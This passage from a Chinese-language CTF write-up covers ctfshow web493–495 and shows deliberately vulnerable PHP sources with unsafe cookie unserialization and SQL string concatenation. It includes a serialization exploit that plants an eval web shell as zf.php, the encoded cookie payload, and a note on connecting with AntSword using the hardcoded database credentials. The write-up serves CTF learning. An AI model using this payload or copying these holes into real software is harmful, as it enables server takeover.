class="keyword">function</span> <span class="title">select_one_array</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;sql=<span class="variable">$sql</span>;</span><br><span class="line"><span class="variable">$conn</span> = db::<span class="title function_ invoke__">getConnection</span>();</span><br><span class="line"><span class="variable">$result</span>=<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;log-&gt;<span class="title function_ invoke__">log</span>(<span class="variable language_">$this</span>-&gt;sql);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbLog</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$log</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;log=<span class="string">&#x27;log/&#x27;</span>.<span class="title function_ invoke__">date_format</span>(<span class="title function_ invoke__">date_create</span>(),<span class="string">&quot;Y-m-d&quot;</span>).<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;content = <span class="variable language_">$this</span>-&gt;content.<span class="title function_ invoke__">date_format</span>(<span class="title function_ invoke__">date_create</span>(),<span class="string">&quot;Y-m-d-H-i-s&quot;</span>).<span class="string">&#x27; &#x27;</span>.<span class="variable">$sql</span>.<span class="string">&#x27; \r\n&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable language_">$this</span>-&gt;log, <span class="variable language_">$this</span>-&gt;content,FILE_APPEND);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&#x2F;render&#x2F;file_class.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 17:56:41</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-09 14:08:48</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fileUtil</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$filename</span>,<span class="variable">$content</span>,<span class="variable">$append</span> =<span class="number">0</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$append</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span>,FILE_APPEND);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>cache_class.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 20:49:18</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-09 12:11:38</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cache</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">create_cache</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.php&#x27;</span>))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">file<span class="title class_">Util</span>::<span class="title function_ invoke__">write</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.php&#x27;</span>,<span class="variable">$content</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get_cache</span>(<span class="params"><span class="variable">$template</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> file<span class="title class_">Util</span>::<span class="title function_ invoke__">read</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">cache_exists</span>(<span class="params"><span class="variable">$template</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单反序列化</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbLog</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span> =<span class="string">&#x27;&lt;?php @eval($_POST[zf]);?&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$log</span> =<span class="string">&quot;./zf.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable language_">$this</span>-&gt;log, <span class="variable language_">$this</span>-&gt;content,FILE_APPEND);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$final</span> = <span class="keyword">new</span> <span class="title class_">dbLog</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;;user=&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$final</span>));</span><br><span class="line"><span class="comment">#;user=O%3A5%3A%22dbLog%22%3A3%3A%7Bs%3A3%3A%22sql%22%3BN%3Bs%3A7%3A%22content%22%3Bs%3A26%3A%22%3C%3Fphp+%40eval%28%24_POST%5Bzf%5D%29%3B%3F%3E%22%3Bs%3A3%3A%22log%22%3Bs%3A8%3A%22.%2Fzf.php%22%3B%7D</span></span><br></pre></td></tr></table></figure><p>这个会写到根目录下面,是网页的根目录,原因是index.php文件调用的file_put_contents()所以以当前目录为基础进行写入</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411215049150.png" alt="image-20220411215049150"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411215056027.png" alt="image-20220411215056027"></p><h1 id="web494-495"><a href="#web494-495" class="headerlink" title="web494-495"></a>web494-495</h1><p>index.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 15:43:51</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-13 19:59:12</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;render/render_class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;render/db_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$action</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$action</span>))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\:|\,/&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line"><span class="variable">$user</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:index.php?action=login&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:index.php?action=login&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;check&#x27;</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/or|and|innodb|sys/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select username from user where username = &#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27; and password=&#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>).<span class="string">&quot;&#x27; order by id limit 1&quot;</span>;</span><br><span class="line"><span class="variable">$db</span>=<span class="keyword">new</span> <span class="title class_">db</span>();</span><br><span class="line"><span class="variable">$user</span>=<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">select_one_array</span>(<span class="variable">$sql</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;user&#x27;</span>,<span class="variable">$user</span>);</span><br><span class="line">template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="string">&#x27;index&#x27;</span>,<span class="variable">$user</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;clear&#x27;</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm -rf cache/*&#x27;</span>);</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;cache clear&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;login&#x27;</span>)&#123;</span><br><span class="line">template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="variable">$action</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="variable">$action</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>render&#x2F;render_class.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 17:52:18</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-13 20:01:31</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;file_class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;cache_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">templateUtil</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$arg</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(cache::<span class="title function_ invoke__">cache_exists</span>(<span class="variable">$template</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> cache::<span class="title function_ invoke__">get_cache</span>(<span class="variable">$template</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$templateContent</span>=file<span class="title class_">Util</span>::<span class="title function_ invoke__">read</span>(<span class="string">&#x27;templates/&#x27;</span>.<span class="variable">$template</span>.<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line"><span class="variable">$cache</span>=template<span class="title class_">Util</span>::<span class="title function_ invoke__">shade</span>(<span class="variable">$templateContent</span>,<span class="variable">$arg</span>);</span><br><span class="line">cache::<span class="title function_ invoke__">create_cache</span>(<span class="variable">$template</span>,<span class="variable">$cache</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cache</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span>  <span class="function"><span class="keyword">function</span> <span class="title">shade</span>(<span class="params"><span class="variable">$templateContent</span>,<span class="variable">$arg</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$arg</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line"><span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="variable">$value</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$templateContent</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>render&#x2F;db_class.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 20:43:40</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-12 17:43:56</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">db</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$log</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$port</span>=<span class="string">&#x27;3306&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$addr</span>=<span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$database</span>=<span class="string">&#x27;ctfshow&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;log=<span class="keyword">new</span> <span class="title class_">dbLog</span>();</span><br><span class="line"><span class="variable language_">$this</span>-&gt;db=<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getConnection</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getConnection</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">mysqli</span>(<span class="variable language_">$this</span>-&gt;addr,<span class="variable language_">$this</span>-&gt;username,<span class="variable language_">$this</span>-&gt;password,<span class="variable language_">$this</span>-&gt;database);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">select_one</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;sql=<span class="variable">$sql</span>;</span><br><span class="line"><span class="variable">$conn</span> = db::<span class="title function_ invoke__">getConnection</span>();</span><br><span class="line"><span class="variable">$result</span>=<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_object</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">select_one_array</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;sql=<span class="variable">$sql</span>;</span><br><span class="line"><span class="variable">$conn</span> = db::<span class="title function_ invoke__">getConnection</span>();</span><br><span class="line"><span class="variable">$result</span>=<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;log-&gt;<span class="title function_ invoke__">log</span>(<span class="variable language_">$this</span>-&gt;sql);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbLog</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$log</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;log=<span class="string">&#x27;log/&#x27;</span>.<span class="title function_ invoke__">date_format</span>(<span class="title function_ invoke__">date_create</span>(),<span class="string">&quot;Y-m-d&quot;</span>).<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;content = <span class="variable language_">$this</span>-&gt;content.<span class="title function_ invoke__">date_format</span>(<span class="title function_ invoke__">date_create</span>(),<span class="string">&quot;Y-m-d-H-i-s&quot;</span>).<span class="string">&#x27; &#x27;</span>.<span class="variable">$sql</span>.<span class="string">&#x27; \r\n&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable language_">$this</span>-&gt;log, <span class="variable language_">$this</span>-&gt;content,FILE_APPEND);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>file_class.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 17:56:41</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-09 14:08:48</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fileUtil</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$filename</span>,<span class="variable">$content</span>,<span class="variable">$append</span> =<span class="number">0</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$append</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span>,FILE_APPEND);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>cache_class.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 20:49:18</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-13 20:02:23</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cache</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">create_cache</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.html&#x27;</span>))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">file<span class="title class_">Util</span>::<span class="title function_ invoke__">write</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.html&#x27;</span>,<span class="variable">$content</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get_cache</span>(<span class="params"><span class="variable">$template</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> file<span class="title class_">Util</span>::<span class="title function_ invoke__">read</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.html&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">cache_exists</span>(<span class="params"><span class="variable">$template</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.html&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为啥没变化,上一题脚本直接过.发现flag没有,可以直接通过蚁剑连接数据库,毕竟我们已经知道用户名和密码了</p><p>要填127.0.0.1哦</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411223652378.png" alt="image-20220411223652378"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411223730608.png" alt="image-20220411223730608"></p><h1 id="web496"><a 